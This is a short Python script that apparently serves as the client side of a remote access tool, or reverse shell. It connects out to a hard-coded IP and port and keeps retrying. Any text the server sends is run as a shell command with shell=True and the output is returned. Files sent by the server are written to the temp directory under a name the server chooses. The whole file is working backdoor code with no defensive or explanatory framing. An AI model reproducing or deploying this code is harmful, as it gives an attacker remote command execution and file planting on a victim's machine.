import socket
import time
import tempfile
import os
import subprocess

def connect(server_ip, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected_once = False
    while True:
        try:
            print("Start")
            client_socket.connect((server_ip, server_port))
            connected_once = True
            print("Connected to the server.")
            receive_data(client_socket)
        except ConnectionRefusedError:
            if connected_once:
                print("Connected once. Connection lost. Retrying in 7 seconds...")
            else:
                print("Connection refused. Retrying in 7 seconds...")
                client_socket.close()
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(7)
                continue
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
                print(f"{type(e).__name__} Connection lost. Retrying in 7 seconds...")
                client_socket.close()
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(7)
                continue

def receive_file(client_socket):
    name = ""
    while True:
        print("Receiving data...")
        data = client_socket.recv(4096).decode()
        print(f"Received data: {data}")
        if "\n" in data:
            name += data.split("\n")[0]
            file_data = data.split("\n", 1)[1].encode()
            break
        name += data
    while True:
        data = client_socket.recv(4096)
        if data.endswith(b"EOF"):
            file_data += data[:-3]
            break
        file_data += data
    temp_dir = tempfile.gettempdir()
    print(f"Saving file to {temp_dir}")
    file_path = os.path.join(temp_dir, name)
    with open(file_path, "wb") as file:
        file.write(file_data)

def send_shell(client_socket, command):
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    client_socket.send(output.stdout.encode('utf-8'))

def receive_data(client_socket):
    try:
        while True:
            data_rec = client_socket.recv(4096).decode()
            flag = data_rec.split("\n")[0]

            if flag == "FILE":
                receive_file(client_socket)
            else:
                send_shell(client_socket, data_rec)
    except:
        print("An error occurred or client disconnected")


def main():
    server_ip = '192.168.0.158'
    server_port = 12345
    connect(server_ip, server_port)
if __name__ == "__main__":
    main()
